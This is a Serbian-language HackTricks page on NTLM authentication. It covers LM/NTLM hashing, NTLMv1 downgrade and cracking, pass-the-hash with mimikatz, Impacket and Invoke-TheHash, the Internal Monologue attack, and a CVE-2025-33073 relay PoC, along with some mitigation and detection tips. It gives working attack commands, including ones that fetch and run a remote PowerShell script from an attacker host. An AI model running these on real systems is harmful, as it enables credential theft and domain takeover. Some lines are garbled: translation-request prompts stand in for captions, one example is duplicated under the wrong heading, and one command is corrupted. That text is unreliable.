# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Osnovne informacije

U okruženjima u kojima su **Windows XP i Server 2003** u upotrebi, koriste se LM (Lan Manager) hash-evi, iako je opšte poznato da se oni mogu lako kompromitovati. Određeni LM hash, `AAD3B435B51404EEAAD3B435B51404EE`, ukazuje na to da se LM ne koristi, odnosno predstavlja hash praznog stringa.

Podrazumevano se kao primarni metod koristi authentication protocol **Kerberos**. NTLM (NT LAN Manager) se aktivira u određenim okolnostima: kada ne postoji Active Directory, kada domen ne postoji, kada Kerberos ne funkcioniše zbog nepravilne konfiguracije ili kada se pokušava uspostaviti konekcija korišćenjem IP adrese umesto validnog hostname-a.

Prisustvo zaglavlja **"NTLMSSP"** u network packet-ima ukazuje na NTLM authentication proces.

Podršku za authentication protocols - LM, NTLMv1 i NTLMv2 - omogućava određeni DLL koji se nalazi na putanji `%windir%\Windows\System32\msv1\_0.dll`.

**Ključne tačke**:

- LM hash-evi su ranjivi, a prazan LM hash (`AAD3B435B51404EEAAD3B435B51404EE`) označava da se LM ne koristi.
- Kerberos je podrazumevani authentication method, dok se NTLM koristi samo pod određenim uslovima.
- NTLM authentication packet-i mogu se identifikovati po zaglavlju "NTLMSSP".
- LM, NTLMv1 i NTLMv2 protocols podržava sistemski fajl `msv1\_0.dll`.

## LM, NTLMv1 i NTLMv2

Možete proveriti i konfigurisati koji protocol će se koristiti:

### GUI

Pokrenite _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. Postoji 6 nivoa (od 0 do 5).

![LM, NTLMv1 i NTLMv2 - GUI: Pokrenite secpol.msc - Local policies - Security Options - Network Security: LAN Manager authentication level. Postoji 6 nivoa (od 0 do 5)](<../../images/image (919).png>)

### Registry

Ovim ćete postaviti nivo 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Moguće vrednosti:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Osnovna NTLM šema autentikacije domena

1. **user** unosi svoje **credentials**
2. Klijentska mašina **šalje authentication request**, šaljući **domain name** i **username**
3. **server** šalje **challenge**
4. **client encrypts** **challenge** koristeći hash lozinke kao ključ i šalje ga kao odgovor
5. **server šalje** **Domain controlleru** **domain name, username, challenge i response**. Ako **nije** konfigurisan Active Directory ili je naziv domena naziv servera, **credentials** se proveravaju **lokalno**.
6. **domain controller proverava da li je sve ispravno** i šalje informacije serveru

**server** i **Domain Controller** mogu da kreiraju **Secure Channel** putem **Netlogon** servera, pošto Domain Controller zna lozinku servera (ona se nalazi u bazi **NTDS.DIT**).

### Lokalna NTLM šema autentikacije

Autentikacija je kao što je pomenuto **ranije, ali** **server** zna **hash usera** koji pokušava da se autentikuje, a koji se nalazi u fajlu **SAM**. Dakle, umesto da pita Domain Controller, **server će sam proveriti** da li user može da se autentikuje.

### NTLMv1 Challenge

**Dužina challenge-a je 8 bajtova**, a **response** je dug 24 bajta.

**NT hash (16 bajtova)** se deli na **3 dela od po 7 bajtova** (7B + 7B + (2B+0x00\*5)): **poslednji deo se popunjava nulama**. Zatim se **challenge** zasebno **cipheruje** svakim delom, a **dobijeni** cipherovani bajtovi se **spajaju**. Ukupno: 8B + 8B + 8B = 24 bajta.

**Problemi**:

- Nedostatak **randomness-a**
- 3 dela mogu biti **napadnuta zasebno** kako bi se pronašao NT hash
- **DES se može crackovati**
- 3. ključ se uvek sastoji od **5 nula**.
- Ako je **challenge isti**, **response** će biti **isti**. Dakle, žrtvi možete zadati kao **challenge** string "**1122334455667788**" i napasti response korišćenjem **precomputed rainbow tabela**.

### NTLMv1 attack

Danas je sve ređe pronaći okruženja sa konfigurisanim Unconstrained Delegation, ali to ne znači da ne možete **abuse-ovati Print Spooler service** koji je konfigurisan.

Možete abuse-ovati neke credentials/sessions koje već imate na AD-u da biste **zatražili od printera da se autentifikuje** prema nekom **hostu pod vašom kontrolom**. Zatim, koristeći `metasploit auxiliary/server/capture/smb` ili `responder`, možete **podesiti authentication challenge na 1122334455667788**, uhvatiti pokušaj autentikacije i, ako je izveden pomoću **NTLMv1**, moći ćete da ga **crackujete**.\
Ako koristite `responder`, možete pokušati da **upotrebite flag `--lm`** kako biste pokušali da **downgrade-ujete** **authentication**.\
_Napomena: za ovu tehniku autentikacija mora biti izvedena pomoću NTLMv1 (NTLMv2 nije validan)._

Imajte na umu da će printer tokom autentikacije koristiti computer account, a computer accounts koriste **duge i random lozinke** koje **verovatno nećete moći da crackujete** pomoću uobičajenih **rečnika**. Međutim, **NTLMv1** autentikacija **koristi DES** ([više informacija ovde](#ntlmv1-challenge)), pa ćete korišćenjem nekih servisa posebno namenjenih za cracking DES-a moći da ga crackujete (na primer, možete koristiti [https://crack.sh/](https://crack.sh) ili [https://ntlmv1.com/](https://ntlmv1.com)).

### NTLMv1 attack sa hashcat-om

NTLMv1 se takođe može razbiti pomoću NTLMv1 Multi Tool-a [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi), koji formatira NTLMv1 poruke na način koji može biti razbijen pomoću hashcat-a.<sup>[[1]](#references)</sup>

Komanda
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
bi prikazalo sledeće:
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Molimo vas da pošaljete sadržaj datoteke koji treba prevesti.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Pokrenite hashcat (distribuirano je najbolje koristiti alat kao što je hashtopolis), jer će u suprotnom ovo trajati nekoliko dana.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
U ovom slučaju znamo da je lozinka za ovo password, pa ćemo varati u demonstracione svrhe:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Sada je potrebno da koristimo hashcat-utilities da bismo konvertovali probijene DES ključeve u delove NTLM hash-a:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Pošaljite poslednji deo teksta za prevod.
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Pošaljite tekstove koje treba spojiti.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**Dužina challenge-a je 8 bajtova** i **šalju se 2 response-a**: jedan je dužine **24 bajta**, dok je dužina **drugog promenljiva**.

**Prvi response** se kreira ciphering-om pomoću **HMAC_MD5** nad **string-om** sastavljenim od **client-a i domena**, pri čemu se kao **key** koristi **hash MD4** od **NT hash-a**. Zatim se **rezultat** koristi kao **key** za ciphering pomoću **HMAC_MD5** nad **challenge-om**. Na to se dodaje **client challenge od 8 bajtova**. Ukupno: 24 B.

**Drugi response** se kreira korišćenjem **nekoliko vrednosti** (novi client challenge, **timestamp** radi sprečavanja **replay attacks**...)

Ako imate **pcap u kojem je zabeležen uspešan proces autentifikacije**, možete pratiti ovaj vodič da biste dobili domen, username, challenge i response, a zatim pokušati da crackujete lozinku: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)<sup>[[2]](#references)</sup>

## Pass-the-Hash

**Kada imate hash žrtve**, možete ga koristiti da biste je **impersonate**.\
Potrebno je da koristite **tool** koji će **izvršiti** **NTLM autentifikaciju koristeći** taj **hash**, **ili** možete kreirati novu **sessionlogon** sesiju i **inject-ovati** taj **hash** u **LSASS**, tako da će se, kada se izvrši bilo koja **NTLM autentifikacija**, koristiti **taj hash**. To je ono što radi mimikatz.

**Imajte na umu da Pass-the-Hash attacks možete izvršavati i pomoću Computer naloga.**

### **Mimikatz**

**Mora se pokrenuti kao administrator**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Ovo će pokrenuti proces koji će pripadati korisniku koji je pokrenuo mimikatz, ali će interno u LSASS sačuvani credentials biti oni koji se nalaze u parametrima mimikatz-a. Zatim možete pristupati network resursima kao da ste taj korisnik (slično triku `runas /netonly`, ali ne morate znati plain-text password).

### Pass-the-Hash iz Linux-a

Možete dobiti code execution na Windows mašinama koristeći Pass-the-Hash iz Linux-a.\
[**Pristupite ovde da biste saznali kako.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket kompajlirani alati za Windows

Možete preuzeti[ Impacket binaries za Windows ovde](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (U ovom slučaju morate navesti komandu; cmd.exe i powershell.exe nisu validni za dobijanje interaktivnog shell-a)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Postoji još nekoliko Impacket binaries...

### Invoke-TheHash

PowerShell skripte možete preuzeti ovde: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Ova funkcija je **mešavina svih ostalih**. Možete proslediti **nekoliko hostova**, **isključiti** neke i **izabrati** **opciju** koju želite da koristite (_SMBExec, WMIExec, SMBClient, SMBEnum_). Ako izaberete bilo koji od **SMBExec** ili **WMIExec**, ali ne navedete parametar _**Command**_, funkcija će samo **proveriti** da li imate **dovoljne dozvole**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Mora se pokrenuti sa administratorskim privilegijama**

Ovaj alat radi isto što i mimikatz (menja memoriju procesa LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Ručno Windows udaljeno izvršavanje sa korisničkim imenom i lozinkom


{{#ref}}
../lateral-movement/
{{#endref}}

## Izdvajanje akreditiva sa Windows hosta

**Za više informacija o tome** [**kako dobiti akreditive sa Windows hosta pročitajte ovu stranicu**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## Internal Monologue attack

Internal Monologue Attack je prikrivena tehnika za izdvajanje akreditiva koja napadaču omogućava da preuzme NTLM hash-eve sa računara žrtve **bez direktne interakcije sa LSASS procesom**. Za razliku od Mimikatz-a, koji direktno čita hash-eve iz memorije i koji endpoint security rešenja ili Credential Guard često blokiraju, ovaj napad koristi **lokalne pozive NTLM authentication paketu (MSV1_0) preko Security Support Provider Interface-a (SSPI)**. Napadač prvo **snižava NTLM postavke** (npr. LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) kako bi osigurao da je NetNTLMv1 dozvoljen. Zatim se predstavlja kao postojeći korisnički token dobijen iz pokrenutih procesa i lokalno pokreće NTLM autentifikaciju radi generisanja NetNTLMv1 odgovora koristeći poznat challenge.<sup>[[4]](#references)</sup>

Nakon hvatanja ovih NetNTLMv1 odgovora, napadač može brzo da povrati originalne NTLM hash-eve pomoću **unapred izračunatih rainbow tabela**, što omogućava dalje Pass-the-Hash napade za lateral movement. Važno je da Internal Monologue Attack ostaje prikriven zato što ne generiše mrežni saobraćaj, ne ubacuje code i ne pokreće direktne memory dump-ove, zbog čega ga je defenderima teže otkriti u poređenju sa tradicionalnim metodama kao što je Mimikatz.

Ako NetNTLMv1 nije prihvaćen — zbog primenjenih security policy-ja — napadač možda neće uspeti da preuzme NetNTLMv1 odgovor.

Da bi rešio ovaj slučaj, Internal Monologue tool je ažuriran: dinamički pribavlja server token pomoću `AcceptSecurityContext()` kako bi i dalje **hvatio NetNTLMv2 odgovore** ako NetNTLMv1 ne uspe. Iako je NetNTLMv2 mnogo teže crack-ovati, on i dalje otvara mogućnost za relay napade ili offline brute-force u ograničenim slučajevima.

PoC se može pronaći na **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.<sup>[[4]](#references)</sup>

## NTLM Relay and Responder

**Detaljniji vodič za izvođenje ovih napada pročitajte ovde:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Parsiranje NTLM izazova iz network capture-a

**Možete koristiti** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM & Kerberos *Reflection* preko Serialized SPN-ova (CVE-2025-33073)

Windows sadrži nekoliko mitigacija koje pokušavaju da spreče *reflection* napade, pri kojima se NTLM (ili Kerberos) autentifikacija koja potiče sa hosta prosleđuje nazad tom **istom** hostu radi dobijanja SYSTEM privilegija.

Microsoft je prekinuo većinu javno dostupnih chain-ova pomoću MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) i kasnijih patch-eva, međutim **CVE-2025-33073** pokazuje da se zaštite i dalje mogu zaobići zloupotrebom načina na koji **SMB client skraćuje Service Principal Names (SPN-ove)** koji sadrže *marshalled* (serialized) target-info.<sup>[[5]](#references)[[6]](#references)</sup>

### TL;DR problema
1. Napadač registruje **DNS A-record** čiji label kodira marshalled SPN – npr.
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Žrtva se primorava da se autentifikuje na taj hostname (PetitPotam, DFSCoerce itd.).
3. Kada SMB client prosledi target string `cifs/srv11UWhRCAAAAA…` funkciji `lsasrv!LsapCheckMarshalledTargetInfo`, poziv `CredUnmarshalTargetInfo` **uklanja** serialized blob, ostavljajući **`cifs/srv1`**.
4. `msv1_0!SspIsTargetLocalhost` (ili ekvivalent za Kerberos) sada smatra da je target *localhost*, jer se kratki deo hosta podudara sa imenom računara (`SRV1`).
5. Shodno tome, server postavlja `NTLMSSP_NEGOTIATE_LOCAL_CALL` i ubacuje **LSASS-ov SYSTEM access-token** u context (za Kerberos se kreira SYSTEM-marked subsession key).
6. Relay-ovanje te autentifikacije pomoću `ntlmrelayx.py` **ili** `krbrelayx.py` daje potpuna SYSTEM prava na istom hostu.<sup>[[5]](#references)</sup>

### Brzi PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Zakrpa i mere ublažavanja
* KB patch za **CVE-2025-33073** dodaje proveru u `mrxsmb.sys::SmbCeCreateSrvCall` koja blokira svaku SMB konekciju čiji target sadrži marshalled info (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* Nametnite **SMB signing** da biste sprečili reflection čak i na nezakrpljenim hostovima.
* Nadgledajte DNS zapise koji liče na `*<base64>...*` i blokirajte coercion vektore (PetitPotam, DFSCoerce, AuthIP...).

### Ideje za detekciju
* Network captures sa `NTLMSSP_NEGOTIATE_LOCAL_CALL` gde se client IP razlikuje od server IP adrese.
* Kerberos AP-REQ koji sadrži subsession key i client principal jednak hostname-u.
* Windows Event 4624/4648 SYSTEM logons neposredno praćeni remote SMB write operacijama sa istog hosta.<sup>[[5]](#references)</sup>

Za **March 2026** local reflection varijantu koja zloupotrebljava **SMB arbitrary ports** i **TCP connection reuse** kako bi dostigla `NT AUTHORITY\SYSTEM`, pogledajte:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [2] [Cracking an NTLMv2 Hash](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash Utilities](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
